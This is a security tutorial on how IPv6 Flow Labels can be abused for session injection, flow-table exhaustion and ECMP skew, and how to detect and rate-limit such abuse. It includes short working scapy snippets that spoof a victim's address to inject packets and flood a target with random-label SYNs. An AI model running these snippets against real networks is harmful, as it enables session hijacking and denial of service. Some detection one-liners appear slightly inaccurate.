# How to Prevent IPv6 Theft and Denial of Service via Flow Labels

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: IPv6, Security, Flow Label, DoS, QoS

Description: Learn how IPv6 Flow Labels can be abused for denial-of-service attacks and traffic theft, and how to implement defenses at the network and firewall level.

## Overview

The IPv6 Flow Label is a 20-bit field intended to allow routers to handle all packets from the same flow identically without inspecting inner headers. While this improves performance, it also enables attackers to manipulate flow classification, bypass per-flow QoS policies, and disrupt stateful processing on firewalls and load balancers.

## IPv6 Flow Label: Intended Use

```
IPv6 Header (40 bytes):
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version| Traffic Class |            Flow Label                 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Flow Label: 20 bits, values 1-0xFFFFF
- Source sets it once per flow
- Routers can use it for ECMP hash without inspecting transport layer
- Stateful devices (firewalls, load balancers) may use it for session lookup
```

RFC 6437 defines the Flow Label specification: it should be set to a pseudo-random value per flow and remain constant for the lifetime of the flow.

## Attack 1: Flow Label Hijacking (Session Theft)

Some load balancers and firewalls use the Flow Label as a fast-path session identifier. An attacker who knows the Flow Label of an existing session can inject packets into that session:

```bash
# Attacker: Sniff the flow label of victim's session
tcpdump -i eth0 'ip6 and tcp and src host victim-ip' -e | grep 'flow'
# → Capture: flowlabel 0xABC12

# Forge packet with same flow label (using scapy)
python3 -c "
from scapy.all import *
pkt = IPv6(src='victim-ip', dst='server-ip', fl=0xABC12)/TCP(dport=80, flags='A')/Raw(b'GET /evil HTTP/1.1\r\n')
send(pkt)
"
# If the load balancer routes by flow label alone → session injected
```

**Defense:** Load balancers and firewalls should not rely solely on Flow Label for session identification — must also verify 5-tuple (src IP, dst IP, src port, dst port, protocol).

## Attack 2: Flow Label Collision DoS

A stateful device maintaining per-flow state indexed by Flow Label can be flooded with varied Flow Labels to exhaust its state table:

```bash
# Attacker sends packets with random flow labels
# Each triggers a new flow table entry
python3 -c "
import random
from scapy.all import *
for i in range(100000):
    pkt = IPv6(dst='target', fl=random.randint(1, 0xFFFFF))/TCP(dport=80, flags='S')
    send(pkt, verbose=0)
"
# → Firewall/load balancer flow table exhausted
```

## Attack 3: ECMP Hash Manipulation

Routers using Flow Label for ECMP load balancing can be forced to route all traffic to a single path:

```bash
# If router hashes only on flow label for ECMP, attacker can set all packets
# to the same flow label → all traffic goes to same ECMP path
# This concentrates load, potentially overloading one link

# Normal ECMP: distributes across links
# Attacker: all packets with fl=0x00001 → same ECMP bucket
```

## Detection

```bash
# Detect Flow Label-based DoS: watch for high cardinality of flow labels from single source
tshark -i eth0 -Y 'ipv6' -T fields -e ipv6.src -e ipv6.flow \
  | sort | awk '{count[$1]++; if(count[$1] > 1000) print "ALERT: " $1 " has " count[$1] " unique flows"}'

# Monitor flow label entropy per source
# Normal: 1 flow label per persistent connection
# Attack: thousands of different flow labels per second from one source
```

```bash
# tshark: Collect flow label statistics
tshark -a duration:60 -i eth0 -Y 'ipv6' -T fields -e ipv6.src -e ipv6.flow \
  | sort | uniq -f 1 | wc -l   # Count unique (src, flow) pairs
```

## Firewall and Rate Limiting Controls

```bash
# ip6tables: Rate limit new IPv6 "flows" (approximated by connection tracking)
ip6tables -A INPUT -p tcp --syn -m limit --limit 100/second --limit-burst 500 -j ACCEPT
ip6tables -A INPUT -p tcp --syn -j DROP

# nftables: Rate limit IPv6 new connections
nft add rule ip6 filter input tcp flags syn limit rate 100/second burst 500 packets accept
nft add rule ip6 filter input tcp flags syn drop
```

### Router-Level Mitigation (Cisco)

```
! Rate-limit flows from single source to prevent table exhaustion
! CoPP entry targeting high flow-label cardinality
class-map match-any IPV6-FLOOD
  match protocol ipv6

policy-map COPP
  class IPV6-FLOOD
   police rate 1 mbps burst 100 kb

control-plane
  service-policy input COPP
```

## RFC 6437 Compliance for Source Hosts

RFC 6437 (The IPv6 Flow Label Specification) requires that:
- Flow Labels be pseudo-random per flow
- Flow Labels remain constant for the flow lifetime
- Flow Labels not be set to 0 unless the source doesn't support them

```bash
# Linux: Check current flow label generation
sysctl net.ipv6.flowlabel_consistency   # 1 = consistent per flow (correct)
sysctl net.ipv6.auto_flowlabels         # 1 = auto-generate (RFC 6437 compliant)

# Ensure auto generation is on
sysctl -w net.ipv6.auto_flowlabels=1
```

## Summary

IPv6 Flow Label attacks exploit devices that use the Flow Label as the sole session identifier (enabling session hijacking), flood with random flow labels to exhaust state tables, or manipulate ECMP hashing. Defenses include: requiring 5-tuple session identification (not just Flow Label), rate-limiting new connections, monitoring for high flow-label cardinality per source, and deploying Control Plane Policing on routers. Ensure Linux hosts follow RFC 6437 with `auto_flowlabels=1`.
